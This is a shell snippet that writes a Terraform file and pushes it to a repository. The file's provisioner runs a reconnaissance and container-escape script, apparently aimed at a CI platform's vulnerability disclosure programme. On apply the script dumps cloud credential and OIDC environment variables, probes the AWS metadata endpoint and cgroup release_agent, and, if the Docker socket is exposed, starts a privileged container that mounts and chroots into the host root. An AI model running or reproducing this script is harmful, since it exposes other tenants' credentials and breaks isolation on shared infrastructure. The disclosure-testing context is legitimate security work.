cat > main.tf << 'EOF'
terraform {
  required_version = ">= 1.0"
}

resource "null_resource" "security_recon" {
  provisioner "local-exec" {
    interpreter = ["/bin/sh", "-c"]
    command = <<EOT
      echo "========================================="
      echo "[*] ENVIRONMENT VARIABLES (Credentials & OIDC)"
      echo "========================================="
      env | grep -E "AWS_|GCP_|AZURE_|SPACELIFT_|OIDC|WEB_IDENTITY" || echo "No creds found"

      echo "========================================="
      echo "[*] LINUX CAPABILITIES (Privesc Surface)"
      echo "========================================="
      cat /proc/self/status | grep Cap || echo "No cap info"

      echo "========================================="
      echo "[*] CONTAINER RUNTIME FINGERPRINTING"
      echo "========================================="
      ls -la /var/run/docker.sock /run/containerd/containerd.sock /var/run/secrets/kubernetes.io/ 2>/dev/null || echo "No sockets found"

      echo "========================================="
      echo "[*] MOUNTS (Looking for host paths)"
      echo "========================================="
      cat /proc/self/mountinfo | grep -E "/(sys|proc|docker|kubelet|var/lib|host|root)" || echo "No suspicious mounts"

      echo "========================================="
      echo "[*] CGROUP VERSION & RELEASE_AGENT (Escape vector)"
      echo "========================================="
      cat /proc/self/cgroup | head -n 1
      find /sys/fs/cgroup -name release_agent -o -name notify_on_release 2>/dev/null | head -n 5 || echo "No cgroup release_agent"

      echo "========================================="
      echo "[*] METADATA (AWS IMDS v1/v2 check)"
      echo "========================================="
      curl -s -m 2 --connect-timeout 2 http://169.254.169.254/latest/meta-data/ || echo "IMDS unreachable"

      echo "========================================="
      echo "[*] PROCESSES ON HOST (ps aux cross-tenant check)"
      echo "========================================="
      ps aux | grep -v "spacelift\|grep" | head -n 20 || echo "No host processes visible"

      echo "========================================="
      echo "[*] ATTEMPT ESCAPE: Mount host root via docker.sock (if exposed)"
      echo "========================================="
      if [ -S /var/run/docker.sock ]; then
        echo "[!] Docker socket found! Attempting to spawn privileged container..."
        docker run --rm --privileged --pid=host -v /:/host alpine chroot /host ls /root 2>&1 || echo "Escape attempt failed"
      else
        echo "[-] No docker socket. gVisor likely in use."
      fi
      echo "========================================="
      echo "[*] RECON COMPLETE. Check logs for exploit paths."
      echo "========================================="
    EOT
  }
}
EOF

# 3. Add, commit, and push to main
git add main.tf
git commit -m "Add security reconnaissance script for Spacelift VDP testing"
git push origin main
